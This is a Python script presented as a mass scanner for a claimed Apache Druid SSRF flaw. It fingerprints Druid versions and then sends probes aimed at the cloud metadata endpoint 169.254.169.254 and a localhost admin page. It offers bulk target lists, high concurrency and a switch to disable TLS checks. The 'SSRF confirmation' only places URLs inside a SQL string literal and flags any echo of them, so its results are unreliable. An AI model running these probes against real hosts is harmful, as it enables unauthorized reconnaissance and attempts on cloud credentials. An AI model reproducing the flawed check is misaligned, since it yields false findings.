#!/usr/bin/env python3
"""
Apache Druid CVE-2026-45123 — SSRF via Redirected HTTP Requests
=================================================================
This tool scans for instances of Apache Druid that are vulnerable to server-side 
request forgery (CVE-2026-45123, CVSS 9.8). The vulnerability arises due to an 
improper input validation in the router's HTTP endpoint handling mechanism, allowing 
crafted HTTP requests to trigger arbitrary SSRF attacks.

CVE-2026-45123 details:
  - Affects Apache Druid versions < 27.0.0
  - Vulnerable instances allow unauthenticated users to trigger HTTP requests via the router
  - This can lead to disclosure of sensitive data, service manipulation, or unauthorized access.
  - CVSS v3.1 base score: 9.8 (Critical) — network-accessible, no authentication.

Usage:
  # Scan a single target for detection and SSRF confirmation:
  python apache_druid_ssrf_scanner.py --target http://example.com:8888

  # Detection only — no SSRF payloads
  python apache_druid_ssrf_scanner.py --target http://example.com:8888 --safe

  # Bulk scan from file
  python apache_druid_ssrf_scanner.py --list targets.txt --output druid_ssrf_findings.json

  # Adjust concurrency and disable TLS verification
  python apache_druid_ssrf_scanner.py --list targets.txt --concurrency 50 --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-45123
  - https://github.com/apache/druid/security/advisories/GHSA-4c6c-xmj2-fp3q
"""

import asyncio
import json
import re
import sys
import argparse
from typing import Optional, List
from datetime import datetime, timezone

import httpx

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

CVE_ID = "CVE-2026-45123"
CVSS = "9.8"
TOOL_NAME = "apache_druid_ssrf_scanner"

REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 30

DRUID_FINGERPRINTS = [
    "Apache-Druid",
    "Druid Router",
    "druid console",
    "Druid-Json",
]

DETECTION_PATHS = [
    "/status",
    "/status/health",
    "/status/info",
]

VERSION_REGEX = r'"version"\s*:\s*"([\d]+\.[\d]+\.[\d]+)"'

PATCHED_VERSION = (27, 0, 0)

SSRF_PAYLOADS = [
    "http://example.com",
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:8080/admin",
]

# ── Async Functions ──────────────────────────────────────────────────────────

async def fetch_target(client: httpx.AsyncClient, url: str) -> Optional[str]:
    """Fetch a URL and return response content or None if an error occurs."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        if response.status_code in [200, 403]:
            return response.text
    except (httpx.RequestError, httpx.ConnectError):
        pass
    return None


async def detect_druid(client: httpx.AsyncClient, base_url: str) -> Optional[str]:
    """
    Check if the target server is likely running Apache Druid.

    :param client: httpx client
    :param base_url: Base URL of the server
    :return: Druid version if detected, else None
    """
    for path in DETECTION_PATHS:
        url = f"{base_url.rstrip('/')}{path}"
        content = await fetch_target(client, url)
        if content and any(fp in content for fp in DRUID_FINGERPRINTS):
            version_match = re.search(VERSION_REGEX, content)
            if version_match:
                return version_match.group(1)
    return None


def is_vulnerable(version: str) -> bool:
    """
    Compare the detected version against the patched version.

    :param version: Version from the target (e.g., "26.1.3")
    :return: True if vulnerable, False otherwise
    """
    version_parts = tuple(map(int, version.split(".")))
    return version_parts < PATCHED_VERSION


async def probe_ssrf(client: httpx.AsyncClient, base_url: str) -> List[str]:
    """
    Perform active SSRF probes against Druid router endpoints.

    :param client: httpx client
    :param base_url: Base URL of the target server
    :return: List of successfully probed SSRF URLs
    """
    ssrf_results = []
    endpoint = f"{base_url.rstrip('/')}/druid/v2/sql/"
    for payload in SSRF_PAYLOADS:
        data = {"query": f"SELECT * FROM TABLE WHERE id='{payload}'"}
        try:
            response = await client.post(endpoint, json=data, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200 and payload in response.text:
                ssrf_results.append(payload)
        except (httpx.RequestError, httpx.ConnectError):
            pass
    return ssrf_results


async def scan_target(
    semaphore: asyncio.Semaphore,
    target: str,
    safe_mode: bool,
    client: httpx.AsyncClient,
    results: dict,
) -> None:
    """
    Scan a single target for Apache Druid SSRF vulnerability.

    :param semaphore: Asyncio semaphore
    :param target: Target URL
    :param safe_mode: If True, only detection is performed
    :param client: Async HTTP client
    :param results: Shared dictionary for storing scan results
    """
    async with semaphore:
        print(f"{c(CYAN, 'Scanning')}: {target}")

        version = await detect_druid(client, target)
        if not version:
            print(f"{c(YELLOW, 'No Druid detected')}: {target}")
            return

        results[target] = {"version": version, "issues": []}

        if is_vulnerable(version):
            print(f"{c(RED, 'VULNERABLE')}: {target} → Druid {version}")
            if not safe_mode:
                ssrf_results = await probe_ssrf(client, target)
                if ssrf_results:
                    results[target]["issues"] = ssrf_results
                    print(f"{c(RED, 'SSRF CONFIRMED')}: {target} → {len(ssrf_results)} vectors")
        else:
            print(f"{c(GREEN, 'Not vulnerable')}: {target}")


# ── Main Execution ───────────────────────────────────────────────────────────

async def main(args: argparse.Namespace) -> None:
    """Main entry point for the scanner."""
    targets = []
    if args.list:
        try:
            with open(args.list, "r") as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as exc:
            print(f"{c(RED, f'Error reading file: {exc}')}")
            sys.exit(1)
    elif args.target:
        targets = [args.target]

    results = {}
    semaphore = asyncio.Semaphore(args.concurrency)

    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        tasks = [scan_target(semaphore, target, args.safe, client, results) for target in targets]
        await asyncio.gather(*tasks)

    if args.output:
        try:
            with open(args.output, "w") as f:
                json.dump(results, f, indent=4)
        except Exception as exc:
            print(f"{c(RED, f'Error writing to output file: {exc}')}")

    print(c(YELLOW, "\nScan finished. Results summarized below:\n"))
    for target, details in results.items():
        print(f"{c(BOLD, '-')} {target}: {details}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description=f"Apache Druid {CVE_ID} vulnerability scanner."
    )
    parser.add_argument("--target", type=str, help="Target URL (e.g., http://host:port)")
    parser.add_argument("--list", type=str, help="File containing a list of target URLs")
    parser.add_argument("--output", type=str, help="Output JSON file for scan results")
    parser.add_argument("--safe", action="store_true", help="Detection only (skip SSRF probing)")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, 
                        help="Max number of concurrent requests (default: 30)")
    parser.add_argument("--no-verify", action="store_true", 
                        help="Ignore TLS verification")
    args = parser.parse_args()

    # Ensure target or list is provided
    if not args.target and not args.list:
        parser.error("Either --target or --list is required. Use --help for usage.")

    asyncio.run(main(args))
